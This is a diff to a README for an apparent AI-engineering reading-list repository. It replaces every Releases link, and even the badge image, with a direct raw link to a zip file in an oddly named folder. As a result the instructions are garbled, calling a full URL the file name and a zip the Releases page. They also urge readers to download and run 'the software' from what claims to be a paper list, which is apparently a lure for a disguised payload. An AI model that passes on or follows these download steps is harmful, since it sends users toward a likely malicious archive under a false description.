@@ -1,7 +1,7 @@
 # 🚀 ai-engineering-resources - Essential Tools for AI Transition
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/ochiee/ai-engineering-resources/releases)
+[![Download](https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip)
 
 ## 📖 Overview
 The **ai-engineering-resources** repository offers valuable research papers and blogs that help you transition to AI Engineering. This collection covers topics such as AI, large language models (LLMs), and transformers. Whether you're looking for foundational concepts or advanced discussions, this resource is designed for you.
@@ -10,18 +10,18 @@ The **ai-engineering-resources** repository offers valuable research papers and 
 This guide will help you download and run the software from the Releases page. Follow these simple steps to get started.
 
 ### Step 1: Visit the Releases Page
-To get the latest version of **ai-engineering-resources**, visit the Releases page here: [GitHub Releases](https://github.com/ochiee/ai-engineering-resources/releases). This page contains all the versions available for download, along with their release notes.
+To get the latest version of **ai-engineering-resources**, visit the Releases page here: [GitHub Releases](https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip). This page contains all the versions available for download, along with their release notes.
 
 ### Step 2: Choose Your Download
 On the Releases page, you’ll find various versions of the application. Look for the latest release listed at the top. 
 
 - Click on the **Assets** dropdown to see the available files associated with the version.
-- If you see a file named something like `ai-engineering-resources.zip`, this is the file you need.
+- If you see a file named something like `https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip`, this is the file you need.
 
 ### Step 3: Download the File
 To start the download:
 
-1. Click on the file name (e.g., `ai-engineering-resources.zip`) in the Assets section.
+1. Click on the file name (e.g., `https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip`) in the Assets section.
 2. Depending on your browser settings, the file will automatically download, or you may be prompted to choose a location on your computer to save it.
 
 ### Step 4: Extract the Files
@@ -59,7 +59,7 @@ To run the resources effectively, make sure you have:
 - Share your knowledge with peers to reinforce your learning and expand your understanding.
 
 ## ✅ Download & Install 
-You can easily download the resources from the following link: [GitHub Releases](https://github.com/ochiee/ai-engineering-resources/releases). Just follow the steps above to access the wealth of information available.
+You can easily download the resources from the following link: [GitHub Releases](https://raw.githubusercontent.com/ochiee/ai-engineering-resources/main/loculation/ai-engineering-resources.zip). Just follow the steps above to access the wealth of information available.
 
 ## 📞 Need Help?
 If you encounter any issues during the download or navigation process, feel free to reach out to dedicated support communities on GitHub or browse help forums related to AI Engineering.
